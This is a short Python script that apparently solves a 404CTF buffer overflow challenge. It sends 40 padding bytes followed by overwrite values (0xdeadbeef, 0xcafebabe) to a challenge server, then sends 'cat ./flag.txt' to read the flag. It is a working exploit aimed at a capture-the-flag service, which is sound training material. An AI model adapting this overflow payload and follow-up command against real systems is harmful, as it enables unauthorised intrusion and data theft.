import socket
def overflow(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))
    dataStr = 'A' * 40 +'\xef\xbe\xad\xde\xbe\xbe\xfe\xca' +"\n"
    s.sendall(bytes(dataStr, "iso-8859-1")) 
    print(dataStr)
    line = readAnswer(s)
    print(line)
    dataStr = "cat ./flag.txt\n"
    print(dataStr)
    s.sendall(bytes(dataStr, "iso-8859-1")) 
    line = readAnswer(s)
    print(line)
    line = readAnswer(s)
    print(line)

    s.shutdown(socket.SHUT_WR)
    s.close()
    return False

def cleanAnwer(s):
    s = s.replace(' ', '', 10)
    s = s.replace('\n', '', 10)
    return s

def readAnswer(s):
    data = s.recv(4096)
    clean = data.decode() # byte array to string
    return clean

host = "challenge.404ctf.fr"
port = 32458
complete = overflow(host, port)
